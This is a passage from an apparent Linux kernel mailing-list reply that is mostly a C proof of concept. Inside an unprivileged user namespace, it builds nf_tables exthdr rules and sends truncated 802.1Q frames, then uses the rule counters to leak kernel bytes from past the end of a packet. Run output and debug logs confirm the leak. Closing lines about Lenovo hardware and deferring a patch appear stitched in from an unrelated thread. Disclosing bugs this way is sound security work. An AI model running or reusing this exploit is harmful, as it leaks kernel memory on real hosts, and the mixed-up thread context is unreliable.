-> static char *nest(char **p, int type)
-> {
->         struct nlattr *a = (struct nlattr *)*p;
-> 
->         a->nla_type = type | NLA_F_NESTED;
->         *p += NLA_HDRLEN;
->         return (char *)a;
-> }
-> static void nest_end(char *a, char *p) { ((struct nlattr *)a)->nla_len
-> = p - a; }
-> 
-> /* ---------------------------------------------------------------- setup */
-> 
-> static void write_file(const char *path, const char *s)
-> {
->         int fd = open(path, O_WRONLY);
-> 
->         if (fd < 0 || write(fd, s, strlen(s)) < 0)
->                 die(path);
->         close(fd);
-> }
-> 
-> static void enter_ns(void)
-> {
->         char map[32];
->         uid_t uid = getuid();
->         gid_t gid = getgid();
-> 
->         if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
->                 die("unshare");
->         write_file("/proc/self/setgroups", "deny");
->         snprintf(map, sizeof(map), "0 %d 1", uid);
->         write_file("/proc/self/uid_map", map);
->         snprintf(map, sizeof(map), "0 %d 1", gid);
->         write_file("/proc/self/gid_map", map);
-> }
-> 
-> static void rtnl_veth(void)
-> {
->         char buf[512] = {}, *p, *li, *id, *peer;
->         struct nlmsghdr *h = (struct nlmsghdr *)buf;
->         int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
-> 
->         h->nlmsg_type = RTM_NEWLINK;
->         h->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
->         p = (char *)NLMSG_DATA(h) + NLMSG_ALIGN(sizeof(struct ifinfomsg));
->         p = put_str(p, IFLA_IFNAME, "vp0");
->         li = nest(&p, IFLA_LINKINFO);
->         p = put(p, IFLA_INFO_KIND, "veth", 4);
->         id = nest(&p, IFLA_INFO_DATA);
->         peer = nest(&p, 1 /* VETH_INFO_PEER */);
->         p += sizeof(struct ifinfomsg);
->         p = put_str(p, IFLA_IFNAME, "vp1");
->         nest_end(peer, p);
->         nest_end(id, p);
->         nest_end(li, p);
->         h->nlmsg_len = p - buf;
->         if (fd < 0 || send(fd, buf, h->nlmsg_len, 0) < 0)
->                 die("RTM_NEWLINK");
->         close(fd);
-> }
-> 
-> static void link_up(const char *name)
-> {
->         struct ifreq ifr = {};
->         int fd = socket(AF_INET, SOCK_DGRAM, 0);
-> 
->         strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
->         if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
->                 die("SIOCGIFFLAGS");
->         ifr.ifr_flags |= IFF_UP;
->         if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
->                 die("SIOCSIFFLAGS");
->         close(fd);
-> }
-> 
-> /* ------------------------------------------------------------- nftables */
-> 
-> static char *msg(char *cur, int type, int flags)
-> {
->         struct nlmsghdr *h = (struct nlmsghdr *)cur;
->         struct nfgen *g = (struct nfgen *)NLMSG_DATA(h);
-> 
->         memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
->         h->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | type;
->         h->nlmsg_flags = NLM_F_REQUEST | flags;
->         h->nlmsg_seq = ++seq;
->         g->family = NFPROTO_NETDEV;
->         return cur + NLMSG_HDRLEN + sizeof(*g);
-> }
-> static char *msg_end(char *cur, char *p) { ((struct nlmsghdr
-> *)cur)->nlmsg_len = p - cur; return p; }
-> static char *batch(char *cur, int type)
-> {
->         struct nlmsghdr *h = (struct nlmsghdr *)cur;
->         struct nfgen *g = (struct nfgen *)NLMSG_DATA(h);
-> 
->         memset(h, 0, NLMSG_HDRLEN + sizeof(*g));
->         h->nlmsg_type = type;
->         h->nlmsg_flags = NLM_F_REQUEST;
->         h->nlmsg_seq = ++seq;
->         h->nlmsg_len = NLMSG_HDRLEN + sizeof(*g);
->         g->res_id = htons(NFNL_SUBSYS_NFTABLES);
->         return cur + h->nlmsg_len;
-> }
-> 
-> static void nft_commit(char *buf, char *end)
-> {
->         char rb[8192];
->         int n;
-> 
->         if (send(nl, buf, end - buf, 0) < 0)
->                 die("nft send");
->         while ((n = recv(nl, rb, sizeof(rb), MSG_DONTWAIT)) > 0) {
->                 struct nlmsghdr *r = (struct nlmsghdr *)rb;
-> 
->                 for (; NLMSG_OK(r, n); r = NLMSG_NEXT(r, n)) {
->                         struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(r);
-> 
->                         if (r->nlmsg_type == NLMSG_ERROR && e->error) {
->                                 errno = -e->error;
->                                 die("nft batch");
->                         }
->                 }
->         }
-> }
-> 
-> static char *rule(char *cur, int t)
-> {
->         uint8_t ud = t, one = 1;
->         char *p, *ex, *e, *d, *v;
-> 
->         p = msg(cur, NFT_MSG_NEWRULE, NLM_F_CREATE | NLM_F_APPEND | NLM_F_ACK);
->         p = put_str(p, NFTA_RULE_TABLE, "t");
->         p = put_str(p, NFTA_RULE_CHAIN, "c");
->         p = put(p, NFTA_RULE_USERDATA, &ud, 1);
->         ex = nest(&p, NFTA_RULE_EXPRESSIONS);
-> 
->         e = nest(&p, NFTA_LIST_ELEM);                   /* exthdr ipv6
-> type t exists */
->         p = put_str(p, NFTA_EXPR_NAME, "exthdr");
->         d = nest(&p, NFTA_EXPR_DATA);
->         p = put_be32(p, NFTA_EXTHDR_DREG, NFT_REG_1);
->         p = put(p, NFTA_EXTHDR_TYPE, &ud, 1);
->         p = put_be32(p, NFTA_EXTHDR_OFFSET, 0);
->         p = put_be32(p, NFTA_EXTHDR_LEN, 1);
->         p = put_be32(p, NFTA_EXTHDR_FLAGS, NFT_EXTHDR_F_PRESENT);
->         nest_end(d, p);
->         nest_end(e, p);
-> 
->         e = nest(&p, NFTA_LIST_ELEM);                   /* cmp reg1 == 1 */
->         p = put_str(p, NFTA_EXPR_NAME, "cmp");
->         d = nest(&p, NFTA_EXPR_DATA);
->         p = put_be32(p, NFTA_CMP_SREG, NFT_REG_1);
->         p = put_be32(p, NFTA_CMP_OP, 0 /* NFT_CMP_EQ */);
->         v = nest(&p, NFTA_CMP_DATA);
->         p = put(p, NFTA_DATA_VALUE, &one, 1);
->         nest_end(v, p);
->         nest_end(d, p);
->         nest_end(e, p);
-> 
->         e = nest(&p, NFTA_LIST_ELEM);                   /* counter */
->         p = put_str(p, NFTA_EXPR_NAME, "counter");
->         nest_end(e, p);
-> 
->         nest_end(ex, p);
->         return msg_end(cur, p);
-> }
-> 
-> static void nft_setup(void)
-> {
->         static char buf[65536];
->         char *cur, *p, *hk;
->         int t = 0, i;
-> 
->         nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
->         if (nl < 0)
->                 die("NETLINK_NETFILTER");
-> 
->         cur = batch(buf, NFNL_MSG_BATCH_BEGIN);
->         p = msg(cur, NFT_MSG_NEWTABLE, NLM_F_CREATE | NLM_F_ACK);
->         p = put_str(p, NFTA_TABLE_NAME, "t");
->         cur = msg_end(cur, p);
->         p = msg(cur, NFT_MSG_NEWCHAIN, NLM_F_CREATE | NLM_F_ACK);
->         p = put_str(p, NFTA_CHAIN_TABLE, "t");
->         p = put_str(p, NFTA_CHAIN_NAME, "c");
->         p = put_str(p, NFTA_CHAIN_TYPE, "filter");
->         hk = nest(&p, NFTA_CHAIN_HOOK);
->         p = put_be32(p, NFTA_HOOK_HOOKNUM, 0 /* NF_NETDEV_INGRESS */);
->         p = put_be32(p, NFTA_HOOK_PRIORITY, 0);
->         p = put_str(p, NFTA_HOOK_DEV, "vp1");
->         nest_end(hk, p);
->         cur = msg_end(cur, p);
->         cur = batch(cur, NFNL_MSG_BATCH_END);
->         nft_commit(buf, cur);
-> 
->         while (t < 256) {
->                 cur = batch(buf, NFNL_MSG_BATCH_BEGIN);
->                 for (i = 0; i < 32 && t < 256; i++)
->                         cur = rule(cur, t++);
->                 cur = batch(cur, NFNL_MSG_BATCH_END);
->                 nft_commit(buf, cur);
->         }
-> }
-> 
-> /* nf_tables dumps nests without NLA_F_NESTED, so walk the levels by hand */
-> #define for_each_nla(x, a, len, rem)
->          \
->         for (x = (struct nlattr *)(a), rem = (len);
->          \
->             rem >= NLA_HDRLEN && x->nla_len >= NLA_HDRLEN &&
-> x->nla_len <= rem; \
->             rem -= NLA_ALIGN(x->nla_len),
->          \
->             x = (struct nlattr *)((char *)x + NLA_ALIGN(x->nla_len)))
-> #define NLA_DATA(x)     ((char *)(x) + NLA_HDRLEN)
-> #define NLA_LEN(x)      ((x)->nla_len - NLA_HDRLEN)
-> 
-> /* rule -> userdata (T) and expressions/elem/data/COUNTER_PACKETS */
-> static void parse_rule(char *a, int len)
-> {
->         struct nlattr *r, *el, *ex, *c;
->         int r1, r2, r3, r4, t = -1;
->         uint64_t pk = 0;
-> 
->         for_each_nla(r, a, len, r1) {
->                 if (r->nla_type == NFTA_RULE_USERDATA)
->                         t = (uint8_t)NLA_DATA(r)[0];
->                 if (r->nla_type != NFTA_RULE_EXPRESSIONS)
->                         continue;
->                 for_each_nla(el, NLA_DATA(r), NLA_LEN(r), r2) {
->                         bool counter = false;
-> 
->                         for_each_nla(ex, NLA_DATA(el), NLA_LEN(el), r3) {
->                                 if (ex->nla_type == NFTA_EXPR_NAME)
->                                         counter =
-> !strcmp(NLA_DATA(ex), "counter");
->                                 else if (ex->nla_type ==
-> NFTA_EXPR_DATA && counter)
->                                         for_each_nla(c, NLA_DATA(ex),
-> NLA_LEN(ex), r4)
->                                                 if (c->nla_type ==
-> NFTA_COUNTER_PACKETS)
->                                                         pk =
-> be64toh(*(uint64_t *)NLA_DATA(c));
->                         }
->                 }
->         }
->         if (t >= 0)
->                 cnt[t] = pk;
-> }
-> 
-> static void read_counters(void)
-> {
->         static char rb[1 << 18];
->         char buf[256], *p = msg(buf, NFT_MSG_GETRULE, NLM_F_DUMP);
->         int n;
-> 
->         p = put_str(p, NFTA_RULE_TABLE, "t");
->         msg_end(buf, p);
->         if (send(nl, buf, ((struct nlmsghdr *)buf)->nlmsg_len, 0) < 0)
->                 die("GETRULE");
->         while ((n = recv(nl, rb, sizeof(rb), 0)) > 0) {
->                 struct nlmsghdr *r = (struct nlmsghdr *)rb;
-> 
->                 for (; NLMSG_OK(r, n); r = NLMSG_NEXT(r, n)) {
->                         char *a = (char *)NLMSG_DATA(r) + sizeof(struct nfgen);
-> 
->                         if (r->nlmsg_type == NLMSG_DONE ||
-> r->nlmsg_type == NLMSG_ERROR)
->                                 return;
->                         parse_rule(a, (char *)r + r->nlmsg_len - a);
->                 }
->         }
-> }
-> 
-> /* --------------------------------------------------------------- probes */
-> 
-> static void tx(const unsigned char *f, int len, uint16_t proto)
-> {
->         struct sockaddr_ll sll = {};
-> 
->         sll.sll_family = AF_PACKET;
->         sll.sll_ifindex = ifi;
->         sll.sll_protocol = htons(proto);
->         sll.sll_halen = ETH_ALEN;
->         if (sendto(pfd, f, len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
->                 die("sendto");
-> }
-> 
-> int main(void)
-> {
->         unsigned char probe[18] = {
->                 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x02, 0x02, 0x02,
-> 0x02, 0x02, 0x02,
->                 0x81, 0x00,             /* ETH_P_8021Q */
->                 0x00, 0x64,             /* vid 100 */
->                 0x86, 0xdd,             /* inner: ETH_P_IPV6, then nothing */
->         };
->         uint64_t before[256];
->         cpu_set_t cs;
->         int r, t, hit = 0;
-> 
->         setvbuf(stdout, NULL, _IONBF, 0);
->         CPU_ZERO(&cs);
->         CPU_SET(0, &cs);
->         sched_setaffinity(0, sizeof(cs), &cs);
-> 
->         if (getuid() == 0) {                    /* drop to an
-> unprivileged user */
->                 setgroups(0, NULL);
->                 if (setresgid(1000, 1000, 1000) || setresuid(1000, 1000, 1000))
->                         die("drop privileges");
->                 prctl(PR_SET_DUMPABLE, 1);      /* lets us write our
-> own uid_map */
->         }
->         printf("[*] uid=%d\n", getuid());
->         enter_ns();
->         /* keep IPv6 autoconf traffic off the veths */
->         write_file("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1");
->         write_file("/proc/sys/net/ipv6/conf/default/disable_ipv6", "1");
->         rtnl_veth();
->         link_up("vp0");
->         link_up("vp1");
->         nft_setup();
-> 
->         pfd = socket(AF_PACKET, SOCK_RAW, 0);
->         ifi = if_nametoindex("vp0");
->         if (pfd < 0 || !ifi)
->                 die("AF_PACKET");
-> 
-> 
->         printf("[*] sending %d 18-byte 802.1Q probes with no IPv6
-> header\n", ROUNDS);
->         read_counters();
->         memcpy(before, cnt, sizeof(before));
->         for (r = 0; r < ROUNDS; r++) {
->                 tx(probe, sizeof(probe), ETH_P_8021Q);
->                 usleep(20000);
->         }
->         read_counters();
->         for (t = 0; t < 256; t++) {
->                 if (cnt[t] == before[t])
->                         continue;
->                 printf("    rule 0x%02x fired %llu/%d: kernel read
-> byte 0x%02x past skb tail\n",
->                       t, (unsigned long long)(cnt[t] - before[t]), ROUNDS, t);
->                 hit += cnt[t] - before[t];
->         }
->         printf("[%c] %d/%d probes leaked a byte from past the end of
-> the packet\n",
->               hit ? '+' : '-', hit, ROUNDS);
->         return !hit;
-> }
-> ```
-> 
-> My run output of your attached patch:
-> ```log
-> [*] sending 64 18-byte 802.1Q probes with no IPv6 header
->     rule 0x01 fired 25/64: kernel read byte 0x01 past skb tail
->     rule 0x02 fired 2/64: kernel read byte 0x02 past skb tail
->     rule 0x03 fired 1/64: kernel read byte 0x03 past skb tail
->     rule 0x74 fired 1/64: kernel read byte 0x74 past skb tail
-> ...
-> ```
-> 
-> I also confirmed the same result after inserting some debug to the kernel.
-> 
-> ```log
-> [    4.041624] DBG_OOB head=ffff888021df96c0 nh=20 tail=20 end=384
-> byte=0x00 ptr16_23(head+544)=0xdf
-> [    4.061809] DBG_OOB head=ffff888021df9a00 nh=20 tail=20 end=384
-> byte=0x00 ptr16_23(head+544)=0xdf
-> [    4.081970] DBG_OOB head=ffff888021df63c0 nh=20 tail=20 end=384
-> byte=0x00 ptr16_23(head+544)=0xdf
-> [    4.102192] DBG_OOB head=ffff888021df6080 nh=20 tail=20 end=384
-> byte=0x00 ptr16_23(head+544)=0xdf
-> [    4.122357] DBG_OOB head=ffff888021de5a00 nh=20 tail=20 end=384
-> byte=0x01 ptr16_23(head+544)=0xde
-> ...
-> ```
-> 
+We also have few Lenovo workstation/server here, but it looks like
+they are not affected.
+>
+> I would rather hold this off for a bit, while we investigate. Though, if the
+> investigation turns out complex, we may apply this patch, at least
+> temporarily, until a better solution is found.
+>
+> --Dima
+>
